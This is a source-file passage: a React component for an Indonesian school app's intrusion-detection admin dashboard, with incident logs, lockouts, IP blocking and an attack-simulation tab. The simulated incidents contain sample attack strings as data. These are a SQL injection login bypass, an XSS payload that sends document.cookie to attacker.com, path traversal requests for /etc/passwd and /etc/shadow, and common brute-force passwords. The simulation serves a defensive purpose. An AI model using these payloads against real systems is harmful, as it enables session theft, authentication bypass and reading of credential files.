import React, { useState, useMemo } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Lock,
  Unlock,
  Ban,
  Activity,
  Flame,
  Search,
  RefreshCw,
  Download,
  Trash2,
  CheckCircle2,
  Eye,
  Sliders,
  Play,
  FileSpreadsheet,
  Globe,
  Clock,
  Terminal,
  Zap,
  Check,
  X,
  Info,
  Server,
  UserX,
} from 'lucide-react';
import * as XLSX from 'xlsx';
import { AppData, BlockedIp, LockedAccount, SecurityConfig, SecurityIncident, UserSession } from '../../types';
import { DEFAULT_SECURITY_CONFIG, formatIndonesianDateTime, getClientMetadata } from '../../utils/securityEngine';
import { PageHeader } from '../common/UIComponents';

interface IntrusionDetectionViewProps {
  appData: AppData;
  currentUser: UserSession;
  onUpdateAppData: (updated: AppData) => void;
  onShowToast: (msg: string, type: 'success' | 'error' | 'warning' | 'info') => void;
  onConfirmModal: (
    title: string,
    message: string,
    type: 'danger' | 'warning' | 'info' | 'emerald',
    onConfirm: () => void
  ) => void;
}

export const IntrusionDetectionView: React.FC<IntrusionDetectionViewProps> = ({
  appData,
  currentUser,
  onUpdateAppData,
  onShowToast,
  onConfirmModal,
}) => {
  const [activeTab, setActiveTab] = useState<'incidents' | 'lockouts' | 'simulation' | 'config'>('incidents');
  const [searchTerm, setSearchTerm] = useState('');
  const [severityFilter, setSeverityFilter] = useState<'all' | 'critical' | 'high' | 'medium' | 'low'>('all');
  const [statusFilter, setStatusFilter] = useState<'all' | 'active' | 'blocked' | 'resolved'>('all');
  const [selectedIncident, setSelectedIncident] = useState<SecurityIncident | null>(null);
  const [isSimulating, setIsSimulating] = useState(false);

  // Manual Block IP modal state
  const [showManualBlockModal, setShowManualBlockModal] = useState(false);
  const [manualIpInput, setManualIpInput] = useState('');
  const [manualReasonInput, setManualReasonInput] = useState('');

  // Security config state
  const config: SecurityConfig = appData.securityConfig || DEFAULT_SECURITY_CONFIG;
  const [tempConfig, setTempConfig] = useState<SecurityConfig>(config);

  const incidents = useMemo(() => appData.securityIncidents || [], [appData.securityIncidents]);
  const blockedIps = useMemo(() => appData.blockedIps || [], [appData.blockedIps]);
  const lockedAccounts = useMemo(() => appData.lockedAccounts || [], [appData.lockedAccounts]);

  // Statistics calculation
  const stats = useMemo(() => {
    const total = incidents.length;
    const critical = incidents.filter((i) => i.severity === 'critical').length;
    const high = incidents.filter((i) => i.severity === 'high').length;
    const medium = incidents.filter((i) => i.severity === 'medium').length;
    const low = incidents.filter((i) => i.severity === 'low').length;
    const activeThreats = incidents.filter((i) => i.status === 'active' || i.status === 'blocked').length;
    const lockedCount = lockedAccounts.length;
    const blockedCount = blockedIps.length;

    let overallThreatLevel: 'NORMAL' | 'ELEVATED' | 'HIGH' | 'CRITICAL' = 'NORMAL';
    if (critical > 0 || lockedCount >= 3) {
      overallThreatLevel = 'CRITICAL';
    } else if (high > 0 || blockedCount >= 3) {
      overallThreatLevel = 'HIGH';
    } else if (medium > 2) {
      overallThreatLevel = 'ELEVATED';
    }

    return {
      total,
      critical,
      high,
      medium,
      low,
      activeThreats,
      lockedCount,
      blockedCount,
      overallThreatLevel,
    };
  }, [incidents, lockedAccounts, blockedIps]);

  // Filtered incidents
  const filteredIncidents = useMemo(() => {
    return incidents.filter((inc) => {
      const matchSearch =
        inc.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
        inc.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (inc.targetUsername && inc.targetUsername.toLowerCase().includes(searchTerm.toLowerCase())) ||
        inc.ipAddress.includes(searchTerm) ||
        (inc.payloadSnippet && inc.payloadSnippet.toLowerCase().includes(searchTerm.toLowerCase()));

      const matchSeverity = severityFilter === 'all' || inc.severity === severityFilter;
      const matchStatus = statusFilter === 'all' || inc.status === statusFilter;

      return matchSearch && matchSeverity && matchStatus;
    });
  }, [incidents, searchTerm, severityFilter, statusFilter]);

  // Actions
  const handleResolveIncident = (id: string) => {
    const updated = incidents.map((inc) =>
      inc.id === id ? { ...inc, status: 'resolved' as const } : inc
    );
    onUpdateAppData({ ...appData, securityIncidents: updated });
    onShowToast('Insiden berhasil ditandai selesai (Resolved).', 'success');
    if (selectedIncident && selectedIncident.id === id) {
      setSelectedIncident({ ...selectedIncident, status: 'resolved' });
    }
  };

  const handleBlockIp = (ip: string, reason: string) => {
    if (!ip) return;
    if (blockedIps.some((b) => b.ip === ip)) {
      onShowToast(`IP ${ip} sudah ada dalam daftar blokir.`, 'warning');
      return;
    }

    const newBlocked: BlockedIp = {
      id: `blk-${Date.now()}`,
      ip,
      reason: reason || 'Manual blocking oleh Administrator',
      blockedAt: formatIndonesianDateTime(new Date()),
      blockedBy: currentUser.data.nama || 'Admin',
      threatCount: 1,
    };

    const updatedIncidents = incidents.map((inc) =>
      inc.ipAddress === ip ? { ...inc, status: 'blocked' as const, actionTaken: 'ip_banned' as const } : inc
    );

    onUpdateAppData({
      ...appData,
      blockedIps: [newBlocked, ...blockedIps],
      securityIncidents: updatedIncidents,
    });

    onShowToast(`IP ${ip} berhasil dimasukkan ke daftar blokir permanen!`, 'success');
  };

  const handleUnblockIp = (ipId: string, ipAddr: string) => {
    onConfirmModal(
      'Buka Blokir IP',
      `Apakah Anda yakin ingin menghapus IP "${ipAddr}" dari daftar blokir? IP ini akan dapat mengakses sistem kembali.`,
      'warning',
      () => {
        const updated = blockedIps.filter((b) => b.id !== ipId);
        onUpdateAppData({ ...appData, blockedIps: updated });
        onShowToast(`Blokir untuk IP ${ipAddr} telah dibuka.`, 'info');
      }
    );
  };

  const handleUnlockAccount = (username: string) => {
    onConfirmModal(
      'Buka Kunci Akun',
      `Buka status penguncian untuk username "${username}"? Pengguna akan dapat mencoba login kembali.`,
      'emerald',
      () => {
        const updated = lockedAccounts.filter((l) => l.username.toLowerCase() !== username.toLowerCase());
        onUpdateAppData({ ...appData, lockedAccounts: updated });
        onShowToast(`Akun "${username}" berhasil dibuka kuncinya!`, 'success');
      }
    );
  };

  const handleClearAllIncidents = () => {
    onConfirmModal(
      'Hapus Seluruh Log Insiden',
      'Tindakan ini akan membersihkan semua riwayat deteksi intrusi dan log keamanan. Lanjutkan?',
      'danger',
      () => {
        onUpdateAppData({ ...appData, securityIncidents: [] });
        onShowToast('Seluruh riwayat insiden keamanan telah dibersihkan.', 'info');
      }
    );
  };

  const handleSaveConfig = (e: React.FormEvent) => {
    e.preventDefault();
    onUpdateAppData({ ...appData, securityConfig: tempConfig });
    onShowToast('Konfigurasi IDS & Kebijakan Keamanan berhasil diperbarui!', 'success');
  };

  // Export to Excel
  const handleExportExcel = () => {
    if (filteredIncidents.length === 0) {
      onShowToast('Tidak ada log insiden untuk diekspor!', 'warning');
      return;
    }

    const data = filteredIncidents.map((inc, i) => ({
      No: i + 1,
      Waktu: inc.formattedTime,
      Tingkat_Ancaman: inc.severity.toUpperCase(),
      Tipe_Serangan: inc.type,
      Judul_Insiden: inc.title,
      Deskripsi: inc.description,
      Target_User: inc.targetUsername || '-',
      IP_Address: inc.ipAddress,
      Lokasi_Perkiraan: inc.locationEstimate || '-',
      Status: inc.status.toUpperCase(),
      Tindakan_Mitigasi: inc.actionTaken,
      Snippet_Payload: inc.payloadSnippet || '-',
      User_Agent: inc.userAgent || '-',
    }));

    const ws = XLSX.utils.json_to_sheet(data);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, 'Log_Deteksi_Intrusi');
    XLSX.writeFile(wb, `Laporan_IDS_Keamanan_${new Date().toISOString().slice(0, 10)}.xlsx`);
    onShowToast('Laporan log deteksi intrusi berhasil diunduh (Excel)!', 'success');
  };

  // Simulation runner
  const runSimulation = (
    type: 'brute_force' | 'sqli' | 'xss' | 'night_anomaly' | 'path_traversal'
  ) => {
    setIsSimulating(true);
    const client = getClientMetadata();

    setTimeout(() => {
      let newInc: SecurityIncident;

      if (type === 'brute_force') {
        newInc = {
          id: `sim-${Date.now()}`,
          timestamp: new Date().toISOString(),
          formattedTime: formatIndonesianDateTime(new Date()),
          type: 'brute_force_login',
          severity: 'high',
          title: '[SIMULASI] Serangan Brute Force Dictionary Login',
          description: `Terdeteksi 6x percobaan password acak cepat pada akun "admin" dari IP ${client.ip}.`,
          targetUsername: 'admin',
          targetRole: 'admin',
          ipAddress: client.ip,
          userAgent: client.userAgent,
          payloadSnippet: 'admin / pass: [admin2026, 12345678, smkn6garut, password, toor, qwerty]',
          status: 'blocked',
          actionTaken: 'account_locked',
          locationEstimate: client.location,
        };

        // Add to locked account as well
        const newLock: LockedAccount = {
          username: 'admin',
          lockedAt: new Date().toISOString(),
          unlocksAt: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
          failedAttempts: 6,
          reason: 'Melebihi batas maksimal 5 kali percobaan login gagal berturut-turut (IDS Rule)',
          lastIp: client.ip,
        };

        const existingLocks = lockedAccounts.filter((l) => l.username !== 'admin');
        onUpdateAppData({
          ...appData,
          securityIncidents: [newInc, ...incidents],
          lockedAccounts: [newLock, ...existingLocks],
        });
      } else if (type === 'sqli') {
        newInc = {
          id: `sim-${Date.now()}`,
          timestamp: new Date().toISOString(),
          formattedTime: formatIndonesianDateTime(new Date()),
          type: 'suspicious_payload',
          severity: 'critical',
          title: '[SIMULASI] Deteksi Injeksi SQL (WAF Signature Triggered)',
          description: `Payload autentikasi mengandung karakter metakueri SQL ilegal: "admin' OR '1'='1" yang diblokir seketika.`,
          targetUsername: "admin' OR '1'='1'--",
          targetRole: 'unknown',
          ipAddress: client.ip,
          userAgent: client.userAgent,
          payloadSnippet: "SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = 'xxx'",
          status: 'blocked',
          actionTaken: 'request_dropped',
          locationEstimate: client.location,
        };

        onUpdateAppData({
          ...appData,
          securityIncidents: [newInc, ...incidents],
        });
      } else if (type === 'xss') {
        newInc = {
          id: `sim-${Date.now()}`,
          timestamp: new Date().toISOString(),
          formattedTime: formatIndonesianDateTime(new Date()),
          type: 'suspicious_payload',
          severity: 'high',
          title: '[SIMULASI] Percobaan Cross-Site Scripting (Stored/Reflected XSS)',
          description: 'Input formulir memuat tag berbahaya `<script>alert(document.cookie)</script>` yang dinetralisir WAF.',
          targetUsername: 'siswa_tester',
          targetRole: 'murid',
          ipAddress: client.ip,
          userAgent: client.userAgent,
          payloadSnippet: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
          status: 'blocked',
          actionTaken: 'request_dropped',
          locationEstimate: client.location,
        };

        onUpdateAppData({
          ...appData,
          securityIncidents: [newInc, ...incidents],
        });
      } else if (type === 'night_anomaly') {
        newInc = {
          id: `sim-${Date.now()}`,
          timestamp: new Date().toISOString(),
          formattedTime: formatIndonesianDateTime(new Date()),
          type: 'anomaly_access_time',
          severity: 'medium',
          title: '[SIMULASI] Anomali Waktu Akses Sesi Dini Hari',
          description: 'Akses kredensial terdeteksi pada pukul 03:12 WIB di luar jam operasional presensi sekolah SMKN 6 Garut.',
          targetUsername: 'guru_piket',
          targetRole: 'guru',
          ipAddress: client.ip,
          userAgent: client.userAgent,
          payloadSnippet: 'Valid Auth Header (Abnormal Timing)',
          status: 'active',
          actionTaken: 'none',
          locationEstimate: client.location,
        };

        onUpdateAppData({
          ...appData,
          securityIncidents: [newInc, ...incidents],
        });
      } else {
        newInc = {
          id: `sim-${Date.now()}`,
          timestamp: new Date().toISOString(),
          formattedTime: formatIndonesianDateTime(new Date()),
          type: 'suspicious_payload',
          severity: 'critical',
          title: '[SIMULASI] Upaya Directory / Path Traversal',
          description: 'Upaya akses berkas sistem direktori internal `../../../../etc/passwd` dicegah oleh filter keamanan.',
          targetUsername: '../../../../etc/passwd',
          targetRole: 'unknown',
          ipAddress: client.ip,
          userAgent: client.userAgent,
          payloadSnippet: 'GET /api/download?file=../../../../etc/shadow HTTP/1.1',
          status: 'blocked',
          actionTaken: 'ip_banned',
          locationEstimate: client.location,
        };

        // Add auto IP ban
        const newBan: BlockedIp = {
          id: `blk-${Date.now()}`,
          ip: client.ip,
          reason: 'Otomatis: Eksploitasi Directory Traversal berulang kali',
          blockedAt: formatIndonesianDateTime(new Date()),
          blockedBy: 'IDS Engine (Auto-WAF)',
          threatCount: 3,
        };

        const existingBans = blockedIps.filter((b) => b.ip !== client.ip);
        onUpdateAppData({
          ...appData,
          securityIncidents: [newInc, ...incidents],
          blockedIps: [newBan, ...existingBans],
        });
      }

      setIsSimulating(false);
      onShowToast(`Simulasi serangan "${type}" berhasil dieksekusi! IDS mencatat insiden baru.`, 'success');
    }, 600);
  };

  const getSeverityBadge = (sev: SecurityIncident['severity']) => {
    switch (sev) {
      case 'critical':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20">
            <Flame className="w-3 h-3 text-rose-500" /> Kritis
          </span>
        );
      case 'high':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20">
            <AlertTriangle className="w-3 h-3 text-amber-500" /> Tinggi
          </span>
        );
      case 'medium':
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-500/20">
            <ShieldAlert className="w-3 h-3 text-blue-500" /> Sedang
          </span>
        );
      default:
        return (
          <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider bg-slate-500/10 text-slate-600 dark:text-slate-400 border border-slate-500/20">
            <Info className="w-3 h-3 text-slate-500" /> Rendah
          </span>
        );
    }
  };

  return (
    <div className="space-y-6 pb-12 animate-in fade-in duration-300">
      {/* HEADER UTAMA */}
      <PageHeader
        icon={ShieldAlert}
        title="Intrusion Detection System (IDS) & Keamanan"
        description="Pusat pemantauan deteksi intrusi, Web Application Firewall (WAF), dan mitigasi ancaman otomatis."
        badge="IDS Engine Aktif"
      >
        <div className="flex flex-wrap items-center gap-2">
          <button
            type="button"
            onClick={handleExportExcel}
            className="px-3.5 py-2 text-xs font-bold rounded-xl bg-white dark:bg-slate-800 hover:bg-slate-50 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 border border-slate-200 dark:border-slate-700 flex items-center gap-1.5 shadow-xs transition"
          >
            <Download className="w-3.5 h-3.5 text-emerald-600" />
            <span>Ekspor Log</span>
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('simulation')}
            className="px-3.5 py-2 text-xs font-bold rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white flex items-center gap-1.5 shadow-md shadow-indigo-600/20 transition"
          >
            <Play className="w-3.5 h-3.5" />
            <span>Uji / Simulasi IDS</span>
          </button>
        </div>
      </PageHeader>

      {/* THREAT STATUS OVERVIEW CARDS */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Card 1: Defense Level */}
        <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex items-center justify-between">
          <div>
            <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">Status Pertahanan</div>
            <div className="text-lg font-black mt-1 flex items-center gap-2">
              {stats.overallThreatLevel === 'NORMAL' && (
                <span className="text-emerald-600 dark:text-emerald-400">NORMAL (AMAN)</span>
              )}
              {stats.overallThreatLevel === 'ELEVATED' && (
                <span className="text-blue-600 dark:text-blue-400">WASPADA</span>
              )}
              {stats.overallThreatLevel === 'HIGH' && (
                <span className="text-amber-600 dark:text-amber-400">ANCAMAN TINGGI</span>
              )}
              {stats.overallThreatLevel === 'CRITICAL' && (
                <span className="text-rose-600 dark:text-rose-400">KRITIS / SIAGA</span>
              )}
            </div>
            <div className="text-[10px] text-slate-500 mt-0.5">WAF & Brute Force Guard Aktif</div>
          </div>
          <div
            className={`w-12 h-12 rounded-2xl flex items-center justify-center font-bold ${
              stats.overallThreatLevel === 'NORMAL'
                ? 'bg-emerald-100 dark:bg-emerald-950/60 text-emerald-600 dark:text-emerald-400'
                : stats.overallThreatLevel === 'CRITICAL'
                ? 'bg-rose-100 dark:bg-rose-950/60 text-rose-600 dark:text-rose-400'
                : 'bg-amber-100 dark:bg-amber-950/60 text-amber-600 dark:text-amber-400'
            }`}
          >
            <Shield className="w-6 h-6" />
          </div>
        </div>

        {/* Card 2: Total Incidents */}
        <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex items-center justify-between">
          <div>
            <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">Insiden Terdeteksi</div>
            <div className="text-2xl font-black text-slate-800 dark:text-white mt-1">{stats.total}</div>
            <div className="text-[10px] text-slate-500 mt-0.5">
              <span className="text-rose-500 font-bold">{stats.critical} Kritis</span> •{' '}
              <span className="text-amber-500 font-bold">{stats.high} Tinggi</span>
            </div>
          </div>
          <div className="w-12 h-12 rounded-2xl bg-blue-100 dark:bg-blue-950/60 text-blue-600 dark:text-blue-400 flex items-center justify-center font-bold">
            <Activity className="w-6 h-6" />
          </div>
        </div>

        {/* Card 3: Locked Accounts */}
        <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex items-center justify-between">
          <div>
            <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">Akun Terkunci (Lockout)</div>
            <div className="text-2xl font-black text-slate-800 dark:text-white mt-1">{stats.lockedCount}</div>
            <div className="text-[10px] text-slate-500 mt-0.5">
              {stats.lockedCount > 0 ? (
                <button
                  type="button"
                  onClick={() => setActiveTab('lockouts')}
                  className="text-indigo-600 dark:text-indigo-400 font-bold hover:underline"
                >
                  Lihat & Buka Kunci
                </button>
              ) : (
                'Tidak ada akun terkunci'
              )}
            </div>
          </div>
          <div className="w-12 h-12 rounded-2xl bg-amber-100 dark:bg-amber-950/60 text-amber-600 dark:text-amber-400 flex items-center justify-center font-bold">
            <Lock className="w-6 h-6" />
          </div>
        </div>

        {/* Card 4: Blocked IPs */}
        <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex items-center justify-between">
          <div>
            <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">IP Diblokir (Blacklist)</div>
            <div className="text-2xl font-black text-slate-800 dark:text-white mt-1">{stats.blockedCount}</div>
            <div className="text-[10px] text-slate-500 mt-0.5">
              <button
                type="button"
                onClick={() => setActiveTab('lockouts')}
                className="text-indigo-600 dark:text-indigo-400 font-bold hover:underline"
              >
                Kelola IP Blacklist
              </button>
            </div>
          </div>
          <div className="w-12 h-12 rounded-2xl bg-rose-100 dark:bg-rose-950/60 text-rose-600 dark:text-rose-400 flex items-center justify-center font-bold">
            <Ban className="w-6 h-6" />
          </div>
        </div>
      </div>

      {/* NAVIGATION SUB-TABS */}
      <div className="flex border-b border-slate-200 dark:border-slate-800 gap-2">
        <button
          type="button"
          onClick={() => setActiveTab('incidents')}
          className={`pb-3 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
            activeTab === 'incidents'
              ? 'border-indigo-600 text-indigo-600 dark:text-indigo-400'
              : 'border-transparent text-slate-500 hover:text-slate-800 dark:hover:text-slate-200'
          }`}
        >
          <Activity className="w-4 h-4" />
          <span>Log Insiden Keamanan ({incidents.length})</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveTab('lockouts')}
          className={`pb-3 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
            activeTab === 'lockouts'
              ? 'border-indigo-600 text-indigo-600 dark:text-indigo-400'
              : 'border-transparent text-slate-500 hover:text-slate-800 dark:hover:text-slate-200'
          }`}
        >
          <Lock className="w-4 h-4" />
          <span>Akun Terkunci & IP Blacklist ({lockedAccounts.length + blockedIps.length})</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveTab('simulation')}
          className={`pb-3 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
            activeTab === 'simulation'
              ? 'border-indigo-600 text-indigo-600 dark:text-indigo-400'
              : 'border-transparent text-slate-500 hover:text-slate-800 dark:hover:text-slate-200'
          }`}
        >
          <Zap className="w-4 h-4" />
          <span>Simulasi Sandbox Serangan</span>
        </button>

        <button
          type="button"
          onClick={() => setActiveTab('config')}
          className={`pb-3 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
            activeTab === 'config'
              ? 'border-indigo-600 text-indigo-600 dark:text-indigo-400'
              : 'border-transparent text-slate-500 hover:text-slate-800 dark:hover:text-slate-200'
          }`}
        >
          <Sliders className="w-4 h-4" />
          <span>Kebijakan & Pengaturan IDS</span>
        </button>
      </div>

      {/* TAB 1: INCIDENT LOGS TABLE */}
      {activeTab === 'incidents' && (
        <div className="space-y-4">
          {/* SEARCH & FILTER BAR */}
          <div className="p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex flex-col md:flex-row items-center justify-between gap-3">
            <div className="relative w-full md:w-80">
              <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                type="text"
                placeholder="Cari IP, username, atau payload..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pl-9 pr-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-800 dark:text-slate-100 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500"
              />
            </div>

            <div className="flex flex-wrap items-center gap-2 w-full md:w-auto">
              <select
                value={severityFilter}
                onChange={(e) => setSeverityFilter(e.target.value as any)}
                className="px-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-200 focus:outline-none"
              >
                <option value="all">Semua Severity</option>
                <option value="critical">Kritis (Critical)</option>
                <option value="high">Tinggi (High)</option>
                <option value="medium">Sedang (Medium)</option>
                <option value="low">Rendah (Low)</option>
              </select>

              <select
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value as any)}
                className="px-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-200 focus:outline-none"
              >
                <option value="all">Semua Status</option>
                <option value="active">Active Threat</option>
                <option value="blocked">Blocked / Mitigated</option>
                <option value="resolved">Resolved</option>
              </select>

              {incidents.length > 0 && (
                <button
                  type="button"
                  onClick={handleClearAllIncidents}
                  className="px-3 py-2 text-xs font-bold text-rose-600 dark:text-rose-400 bg-rose-50 dark:bg-rose-950/40 hover:bg-rose-100 dark:hover:bg-rose-900/40 rounded-xl transition flex items-center gap-1"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  <span>Bersihkan Log</span>
                </button>
              )}
            </div>
          </div>

          {/* INCIDENTS LIST */}
          {filteredIncidents.length === 0 ? (
            <div className="p-12 text-center rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-400">
              <ShieldCheck className="w-12 h-12 mx-auto text-emerald-500 mb-2 opacity-80" />
              <div className="font-bold text-slate-700 dark:text-slate-200 text-sm">Tidak Ada Insiden Keamanan</div>
              <div className="text-xs text-slate-500 mt-1">
                {searchTerm ? 'Tidak ada insiden yang cocok dengan filter pencarian.' : 'Sistem aman dan belum terdeteksi anomali mencurigakan.'}
              </div>
            </div>
          ) : (
            <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl overflow-hidden shadow-xs">
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800/80 border-b border-slate-200 dark:border-slate-800 text-slate-500 dark:text-slate-400 font-bold uppercase tracking-wider text-[10px]">
                    <tr>
                      <th className="py-3 px-4">Waktu</th>
                      <th className="py-3 px-4">Tingkat</th>
                      <th className="py-3 px-4">Judul & Tipe Serangan</th>
                      <th className="py-3 px-4">Target Akun</th>
                      <th className="py-3 px-4">IP / Lokasi</th>
                      <th className="py-3 px-4">Mitigasi</th>
                      <th className="py-3 px-4 text-right">Aksi</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800/60">
                    {filteredIncidents.map((inc) => (
                      <tr
                        key={inc.id}
                        className="hover:bg-slate-50/80 dark:hover:bg-slate-800/40 transition"
                      >
                        <td className="py-3 px-4 whitespace-nowrap text-slate-500 font-mono text-[11px]">
                          {inc.formattedTime}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap">{getSeverityBadge(inc.severity)}</td>
                        <td className="py-3 px-4">
                          <div className="font-bold text-slate-800 dark:text-slate-100">{inc.title}</div>
                          <div className="text-[11px] text-slate-500 line-clamp-1">{inc.description}</div>
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap font-semibold text-slate-700 dark:text-slate-300">
                          {inc.targetUsername ? (
                            <span className="px-2 py-0.5 rounded-md bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-200 font-mono text-[11px]">
                              {inc.targetUsername}
                            </span>
                          ) : (
                            '-'
                          )}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap font-mono text-[11px] text-slate-600 dark:text-slate-300">
                          <div>{inc.ipAddress}</div>
                          <div className="text-[10px] text-slate-400">{inc.locationEstimate || 'Indonesia'}</div>
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap">
                          {inc.status === 'blocked' ? (
                            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20 flex items-center gap-1 w-fit">
                              <Check className="w-3 h-3" /> Terblokir Otomatis
                            </span>
                          ) : inc.status === 'resolved' ? (
                            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-slate-500/10 text-slate-600 dark:text-slate-400 border border-slate-500/20 flex items-center gap-1 w-fit">
                              <CheckCircle2 className="w-3 h-3" /> Selesai
                            </span>
                          ) : (
                            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20 flex items-center gap-1 w-fit">
                              <AlertTriangle className="w-3 h-3" /> Perlu Review
                            </span>
                          )}
                        </td>
                        <td className="py-3 px-4 whitespace-nowrap text-right space-x-1">
                          <button
                            type="button"
                            onClick={() => setSelectedIncident(inc)}
                            className="p-1.5 text-slate-500 hover:text-indigo-600 dark:hover:text-indigo-400 bg-slate-100 dark:bg-slate-800 rounded-lg transition"
                            title="Detail Forensik Insiden"
                          >
                            <Eye className="w-3.5 h-3.5" />
                          </button>
                          {inc.status !== 'resolved' && (
                            <button
                              type="button"
                              onClick={() => handleResolveIncident(inc.id)}
                              className="p-1.5 text-emerald-600 dark:text-emerald-400 hover:bg-emerald-50 dark:hover:bg-emerald-950/40 bg-slate-100 dark:bg-slate-800 rounded-lg transition"
                              title="Tandai Selesai"
                            >
                              <Check className="w-3.5 h-3.5" />
                            </button>
                          )}
                          {!blockedIps.some((b) => b.ip === inc.ipAddress) && (
                            <button
                              type="button"
                              onClick={() => handleBlockIp(inc.ipAddress, `Blokir dari insiden ${inc.title}`)}
                              className="p-1.5 text-rose-600 dark:text-rose-400 hover:bg-rose-50 dark:hover:bg-rose-950/40 bg-slate-100 dark:bg-slate-800 rounded-lg transition"
                              title="Blokir IP Ini"
                            >
                              <Ban className="w-3.5 h-3.5" />
                            </button>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: LOCKED ACCOUNTS & BLOCKED IPS */}
      {activeTab === 'lockouts' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* LOCKED ACCOUNTS SECTION */}
          <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs space-y-4">
            <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-xl bg-amber-100 dark:bg-amber-950/60 text-amber-600 flex items-center justify-center font-bold">
                  <UserX className="w-4 h-4" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-slate-800 dark:text-slate-100">Daftar Akun Terkunci (Account Lockout)</h3>
                  <p className="text-[11px] text-slate-400">Akun yang dinonaktifkan sementara akibat gagal login berturut-turut.</p>
                </div>
              </div>
              <span className="px-2 py-0.5 rounded-full text-xs font-extrabold bg-amber-500/10 text-amber-600 dark:text-amber-400">
                {lockedAccounts.length} Akun
              </span>
            </div>

            {lockedAccounts.length === 0 ? (
              <div className="p-8 text-center text-slate-400 text-xs">
                <CheckCircle2 className="w-8 h-8 mx-auto text-emerald-500 mb-1 opacity-70" />
                Tidak ada akun yang sedang terkunci saat ini.
              </div>
            ) : (
              <div className="space-y-3">
                {lockedAccounts.map((lck) => (
                  <div
                    key={lck.username}
                    className="p-3.5 rounded-xl border border-amber-200 dark:border-amber-900/40 bg-amber-50/50 dark:bg-amber-950/20 flex items-center justify-between gap-3"
                  >
                    <div>
                      <div className="font-bold text-slate-800 dark:text-white flex items-center gap-2">
                        <span className="font-mono text-xs text-amber-700 dark:text-amber-400">{lck.username}</span>
                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-amber-200 dark:bg-amber-900/60 text-amber-800 dark:text-amber-300 font-bold">
                          {lck.failedAttempts}x Percobaan Gagal
                        </span>
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">{lck.reason}</div>
                      <div className="text-[10px] text-slate-400 mt-0.5">
